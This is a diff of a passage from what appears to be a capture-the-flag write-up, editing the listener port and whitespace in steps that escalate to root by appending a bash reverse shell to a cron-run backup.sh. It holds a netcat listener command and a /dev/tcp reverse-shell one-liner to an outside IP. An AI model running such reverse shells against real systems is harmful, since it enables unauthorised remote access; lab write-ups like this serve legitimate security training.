@@ -332,7 +332,7 @@ Let's try to exploit the backup.sh with a bash reverse shell:
 First, start a new netcat session on your system:
 
 ```sh
-nc -lvnp 9999
+nc -lvnp 7777
 ```
 
 Then append the bash reverse shell to the backup script:
@@ -341,7 +341,7 @@ Then append the bash reverse shell to the backup script:
 echo "bash -i >& /dev/tcp/10.9.182.239/7777 0>&1" >> backup.sh
 ```
 
-After waiting at most 59 secounds the backup job will trigger, run our modified script and we get another shell from the container host system. 
+After waiting at most 59 secounds the backup job will trigger, run our modified script and we get another shell from the container host system.
 
 Running ```whoami``` we can see that we are root - whoop whoop!
 
